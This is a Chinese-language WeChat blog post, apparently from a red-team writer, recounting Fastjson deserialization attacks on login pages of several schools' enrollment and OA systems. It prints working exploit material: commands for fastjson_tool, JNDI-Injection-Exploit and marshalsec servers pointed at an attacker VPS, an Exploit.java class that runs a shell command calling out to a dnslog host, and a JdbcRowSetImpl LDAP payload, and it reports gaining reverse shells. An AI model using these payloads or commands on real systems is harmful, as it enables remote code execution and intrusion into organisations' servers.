#  红队评估 | 关于我在实战中遇到的Fastjson

原创 yourposec  [ 不懂安全的校长 ](javascript:void\(0\);)

**不懂安全的校长** ![]()

微信号 sectip

功能介绍 校长不懂安全，总是发些奇奇怪怪的笔记！

____

__

收录于话题

## 0x01 前言

Hvv五件套: Log4j，Shiro，SpringBoot，Fastjson，弱口令

  

推荐一个论坛社区，感觉文章质量挺不错的

    
    
    https://www.cnsuc.net/  
    

## 0x02 案例一: 某职业学院报名登录入口存在fastjson

某学校官网看到一个高职扩招报名入口，点击进去,输入账号密码

![](https://gitee.com/fuli009/images/raw/master/public/20220220001814.png)

后无意看到burp插件扫出改登录口存在fastjson漏洞。

一般当我们看到利用链是用小于或登录1.2.47的利用链的时候这个漏洞就是稳稳存在的，如果是HTTP请求利用链的话，只能说明改网站用的是fastjson框架，但不一定是fastjson反序列化漏洞

![](https://gitee.com/fuli009/images/raw/master/public/20220220001816.png)

使用fastjson_tool去构造fastjson1.2.24-1.2.47左右的利用链 java -jar fastjson_tool.jar
fastjson.HLDAPServeer vps_ip 8080 "command" 然后可随意使用某条利用链后使用利用链请求，成功反弹shell

![](https://gitee.com/fuli009/images/raw/master/public/20220220001817.png)![](https://gitee.com/fuli009/images/raw/master/public/20220220001823.png)

## 0x03 案例二: 某学院OA系统fastjson

某学校OA后台登录框中测试，登录入口存在fastjson<=1.2.47的反序列化漏洞

![](https://gitee.com/fuli009/images/raw/master/public/20220220001826.png)![](https://gitee.com/fuli009/images/raw/master/public/20220220001828.png)

通过利用链可看出该fastjson版本在1.2.47左右,这里我们直接使用

    
    
    java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C '[command]ping dnslog.cn' -A vps_ip  
    

![](https://gitee.com/fuli009/images/raw/master/public/20220220001831.png)

这里选择的利用链要和我们服务器对应得java版本一样,这里选择jdk1.8版本得进行测试ldap和rmi，并无任意返回

后面就进入了沉思阶段，想着使用飞鸿得JNID回显利用链进行反弹，然后得然后，github突然打不开了，后发现jdk1.8和jdk1.7之间还有个spring1.2.x
和tomcat 8版本左右得利用链，想着死马当活马医算了，结果还真rce了（当然飞鸿师傅的JNDI注入回显利用工具也是可以的）

![](https://gitee.com/fuli009/images/raw/master/public/20220220001834.png)

使用该工具去反弹shell得时候我们需要去java.lang网站去进行base64编码

![](https://gitee.com/fuli009/images/raw/master/public/20220220001837.png)![](https://gitee.com/fuli009/images/raw/master/public/20220220001838.png)

成功反弹shell

![](https://gitee.com/fuli009/images/raw/master/public/20220220001841.png)![](https://gitee.com/fuli009/images/raw/master/public/20220220001843.png)

## 0x04 案例三

同样也是在某次后台登陆时，发现请求包时json格式，然后立马去看看工具里面有无fastjson成功记录，结果是有的，这种http请求利用链一般都是1.2.24反序化得利用链。

![](https://gitee.com/fuli009/images/raw/master/public/20220220001845.png)

但是看到http请求利用链心就凉了一大截，如果是HTTP请求利用链的话，之能说明改网站用的是fastjson框架，但不一定存在fastjson反序列化漏洞，这里一开始是使用了fastjson_tools和JNDI-
Injection-Exploit-1.0-SNAPSHOT-all.jar都无请求成功结果。后面使用最古老的方式，先构造Exploit.java文件。

    
    
    import java.io.BufferedReader;  
    import java.io.InputStream;  
    import java.io.InputStreamReader;  
      
    public class Exploit{  
        public Exploit() throws Exception {  
            Process p = Runtime.getRuntime().exec(new String[]{"bash", "-c", "curl omqq0z.dnslog.cn"});  
            InputStream is = p.getInputStream();  
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));  
      
            String line;  
            while((line = reader.readLine()) != null) {  
                System.out.println(line);  
            }  
      
            p.waitFor();  
            is.close();  
            reader.close();  
            p.destroy();  
        }  
      
        public static void main(String[] args) throws Exception {  
        }  
    }  
    

 **附加：利用链,自己也可以去网上收集利用链**

    
    
    {  
      
        "b":{  
      
            "@type":"com.sun.rowset.JdbcRowSetImpl",  
      
            "dataSourceName":"ldap://ip:9999/Exploit",  
      
            "autoCommit":true  
      
        }  
      
    }  
    

![](https://gitee.com/fuli009/images/raw/master/public/20220220001848.png)

然后使用javac Exploit.java为一个class文件，同时在同目录下开一个http服务（因为懒所以就没有截图了）

![](https://gitee.com/fuli009/images/raw/master/public/20220220001851.png)

看网上都是使用RMI格式进行rce，这里我们也是首先尝试RMI

    
    
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “http://vps_ip/8000/#Exploit" 9999  
    

![](https://gitee.com/fuli009/images/raw/master/public/20220220001854.png)

RMI服务这边有回显，但是http服务那边无请求

![](https://gitee.com/fuli009/images/raw/master/public/20220220001856.png)![](https://gitee.com/fuli009/images/raw/master/public/20220220001859.png)

使用LDAP进行请求rce，ldap服务这边有请求回显、http服务有请求回显，命令执行成功。

![](https://gitee.com/fuli009/images/raw/master/public/20220220001902.png)

构造bash反弹，成功getshell (工具githu上全有，自己所搜就行)

![](https://gitee.com/fuli009/images/raw/master/public/20220220001905.png)![](https://gitee.com/fuli009/images/raw/master/public/20220220001908.png)

**从现在开始，星球定价150元！日后只有慢慢涨没有跌价！现在入股不亏，持续输出原创文章，还是小有干货的！**![](https://gitee.com/fuli009/images/raw/master/public/20220220001911.png)  

预览时标签不可点

收录于话题 #

 个

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

红队评估 | 关于我在实战中遇到的Fastjson

最多200字，当前共字

__

发送中

[写留言](javascript:;)

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

